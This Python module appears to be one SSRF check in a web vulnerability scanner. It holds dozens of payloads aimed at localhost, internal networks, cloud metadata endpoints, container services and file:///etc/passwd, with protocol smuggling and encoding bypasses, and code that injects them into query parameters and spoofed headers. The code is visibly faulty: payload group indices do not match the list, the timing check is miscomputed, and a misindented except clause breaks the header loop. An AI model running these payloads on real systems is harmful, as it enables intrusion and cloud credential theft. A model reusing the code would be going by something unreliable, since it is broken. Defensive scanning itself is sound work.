import requests
import time
import ipaddress
import socket
import urllib.parse
from . import get_session

# Advanced SSRF payloads targeting various internal services and bypass techniques
SSRF_PAYLOADS = [
    # Basic internal network targets
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0/",
    
    # Internal IP ranges
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://192.168.1.1/",
    
    # Decimal IP Conversion
    "http://2130706433/", # 127.0.0.1 in decimal
    "http://0177.0000.0000.0001/", # 127.0.0.1 in octal
    "http://0x7f.0x0.0x0.0x1/", # 127.0.0.1 in hex
    
    # DNS rebinding
    "http://attacker-controlled-dns.com/", # Would be set up to return internal IP
    
    # Common cloud metadata endpoints
    "http://169.254.169.254/latest/meta-data/", # AWS
    "http://metadata.google.internal/", # GCP
    "http://169.254.169.254/metadata/v1/", # DigitalOcean
    "http://169.254.169.254/metadata/instance?api-version=2019-06-01", # Azure
    
    # Protocol smuggling
    "gopher://127.0.0.1:25/xSMTP",
    "gopher://127.0.0.1:80/1GET%20/admin%20HTTP/1.1%0A%0A",
    "file:///etc/passwd",
    "file://c:/windows/win.ini",
    "dict://localhost:11211/",  # Memcached
    "ftp://localhost:21/",
    
    # Encoded and obfuscated URLs
    "http://localhost%2f@127.0.0.1",
    "http://127.0.0.1%252f@127.0.0.1",
    "http://127.0.0.1:80%23@google.com/",
    "http://127.0.0.1%09@google.com/",
    
    # DNS redirections and URL shorteners
    "http://localtest.me/",  # Resolves to 127.0.0.1
    "http://spoofed.burpcollaborator.net/",  # Would be set up for testing
    
    # IPv6 variants
    "http://[::ffff:127.0.0.1]/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    
    # Non-standard ports for internal services
    "http://127.0.0.1:22/",  # SSH
    "http://127.0.0.1:3306/", # MySQL
    "http://127.0.0.1:6379/", # Redis
    "http://127.0.0.1:5432/", # PostgreSQL
    "http://127.0.0.1:8080/", # Common web service port
    "http://127.0.0.1:9200/", # Elasticsearch
    
    # Backend web servers and admin interfaces
    "http://localhost:8080/actuator", # Spring Boot
    "http://localhost:9000/console", # H2 Database
    "http://localhost:15672/", # RabbitMQ Management
    "http://localhost:8081/", # Common alternative web port
    
    # Double URL encoding
    "http://127.0.0.1%252f/",
    
    # CIDR notation variation
    "http://127.0.0.1/24",
    
    # New: Modern cloud service endpoints
    "http://100.100.100.200/latest/meta-data/", # Alibaba Cloud
    "http://169.254.169.254/computeMetadata/v1/", # GCP with path
    "http://fd00:ec2::254/latest/meta-data/", # AWS IPv6
    
    # New: Container environment payloads
    "http://host.docker.internal/",
    "http://kubernetes.default.svc",
    "http://127.0.0.1:10250/", # Kubelet
    
    # New: Serverless environment
    "http://localhost:9001/", # AWS Lambda
    
    # New: Newer RFC-compliant IPv6 localhost variants
    "http://[::]:80/",
    "http://0000::1/",
    
    # New: Advanced DNS bypass using FQDN
    "http://127.0.0.1.nip.io/",
    "http://localhost.localtest.me/",
]

# Group payloads by type for more efficient testing
PAYLOAD_GROUPS = {
    "basic": [0, 5],     # Test basic payloads first for quick validation
    "cloud": [13, 18],   # Cloud metadata - high value targets
    "encoded": [22, 27], # Encoded payloads - bypass simple filters
    "protocols": [19, 22], # Non-HTTP protocols - additional attack surfaces
    "advanced": [41, 54] # Newest/most advanced payloads
}

def check(target_url, session=None):
    req_session = get_session(session)
    findings = []
    
    # Parse the target URL to extract possible parameters for SSRF testing
    parsed_url = urllib.parse.urlparse(target_url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    
    # Store baseline response metrics
    try:
        baseline_response = req_session.get(target_url, timeout=5)
        baseline_status = baseline_response.status_code
        baseline_time = time.time()
        baseline_length = len(baseline_response.text)
        baseline_response.close()
    except Exception:
        return findings
    
    # Track tested patterns to avoid redundant tests
    tested_patterns = set()
    successful_params = set()
    
    # First, check basic payloads on all parameters to quickly identify vulnerable parameters
    for param_name, param_values in query_params.items():
        # Start with basic payloads for faster testing
        start, end = PAYLOAD_GROUPS["basic"]
        basic_payloads = SSRF_PAYLOADS[start:end]
        
        for payload in basic_payloads:
            evidence_key = f"{param_name}:{payload[:20]}" 
            if evidence_key in tested_patterns:
                continue
            
            tested_patterns.add(evidence_key)
            
            # Replace parameter with SSRF payload
            new_params = query_params.copy()
            new_params[param_name] = [payload]
            
            # Construct the new query string
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            
            # Create the new URL with the SSRF payload
            test_url = urllib.parse.urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            try:
                start_time = time.time()
                response = req_session.get(test_url, timeout=3, allow_redirects=False)
                response_time = time.time() - start_time
                
                # Enhanced detection for successful SSRF
                # Look for indicators of successful SSRF
                if any(indicator in response.text for indicator in [
                    'root:', 'Internal Server Error', 'mysql>', 'redis_version', 'ami-id', 
                    'instance-id', 'computeMetadata', 'kubernetes', 'docker', 'lambda',
                    '[drivers]', '[boot loader]'  # Windows file content markers
                ]):
                    finding = f"Potential SSRF found with parameter {param_name} using payload: {payload}"
                    findings.append(finding)
                    successful_params.add(param_name)
                
                # Check for significant response time difference 
                if response_time > 2.5 and (response_time > 1.5 * (time.time() - baseline_time)):
                    finding = f"Potential time-based SSRF with parameter {param_name} using payload: {payload}"
                    findings.append(finding)
                    successful_params.add(param_name)
                
                # Check for status code changes
                if response.status_code != baseline_status:
                    finding = f"Status code changed ({baseline_status} -> {response.status_code}) with parameter {param_name} using payload: {payload}"
                    findings.append(finding)
                    successful_params.add(param_name)
                
                # Check response length - might indicate internal content disclosure
                if abs(len(response.text) - baseline_length) > (baseline_length * 0.3) and baseline_length > 100:
                    finding = f"Response size significantly changed with parameter {param_name} using payload: {payload}"
                    findings.append(finding)
                    successful_params.add(param_name)
                
                response.close()
            except requests.exceptions.Timeout:
                findings.append(f"Request timeout with parameter {param_name} using payload: {payload} - possible SSRF to a filtered port")
                successful_params.add(param_name)
            except requests.exceptions.ConnectionError:
                # This could indicate a successful SSRF to an invalid internal host
                findings.append(f"Connection error with parameter {param_name} using payload: {payload} - possible SSRF")
                successful_params.add(param_name)
            except Exception as e:
                continue
    
    # If we found vulnerable parameters, test more advanced payloads on those parameters only
    if successful_params:
        for param_name in successful_params:
            for group_name in ["cloud", "encoded", "protocols", "advanced"]:
                start, end = PAYLOAD_GROUPS[group_name]
                for payload in SSRF_PAYLOADS[start:end]:
                    evidence_key = f"{param_name}:{payload[:20]}" 
                    if evidence_key in tested_patterns:
                        continue
                    
                    tested_patterns.add(evidence_key)
                    
                    # Replace parameter with SSRF payload
                    new_params = query_params.copy()
                    new_params[param_name] = [payload]
                    
                    # Construct the new query string
                    new_query = urllib.parse.urlencode(new_params, doseq=True)
                    
                    # Create the new URL with the SSRF payload
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        new_query,
                        parsed_url.fragment
                    ))
                    
                    try:
                        start_time = time.time()
                        response = req_session.get(test_url, timeout=3, allow_redirects=False)
                        response_time = time.time() - start_time
                        
                        # Enhanced detection for successful SSRF
                        if any(indicator in response.text for indicator in [
                            'root:', 'Internal Server Error', 'mysql>', 'redis_version', 'ami-id', 
                            'instance-id', 'computeMetadata', 'kubernetes', 'docker', 'lambda',
                            '[drivers]', '[boot loader]'  # Windows file content markers
                        ]):
                            findings.append(f"Potential SSRF found with parameter {param_name} using payload: {payload}")
                        
                        # Skip other checks if we've already found an issue with this parameter
                        response.close()
                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                        # Already found this parameter vulnerable, no need to add more findings
                        continue
                    except Exception:
                        continue
    
    # Additional test: Try sending payloads in headers that might be used for callbacks
    if len(findings) < 3:  # Only try this if we haven't found many issues yet
        headers_to_test = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded-Host": "internal-system",
            "Referer": "http://localhost/admin",
            "X-Api-Url": "http://169.254.169.254/",
            "X-Original-URL": "file:///etc/passwd",
            # New: Additional header-based SSRF vectors
            "Origin": "http://localhost",
            "X-Client-IP": "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-Forwarded-Scheme": "http",
            "X-Host": "localhost"
        }
        
        for header, value in headers_to_test.items():
            try:
                response = req_session.get(target_url, headers={header: value}, timeout=3)
                if abs(len(response.text) - baseline_length) > 100:  # Significant difference in response size
                    findings.append(f"Potential SSRF via {header} header with value: {value}")
                response.close()
        except Exception:
            continue
    
    # De-duplicate findings
    return list(set(findings))

# === Exotic Payloads Enhancement ===

# SSRF evasions
#    "http://[::ffff:127.0.0.1]/",
#    "http://127.0.0.1.attacker.com",
#    "http://2130706433",
#    "http://127.1",
#    "http://127.0.0.1%00.example.com"

# === Advanced SSRF Payloads ===
#    "http://2852039166/",
#    "http://127.0.0.1\\@api.example.com/resource",
#    "http://attacker-host.com/redirect?url=http://localhost/",
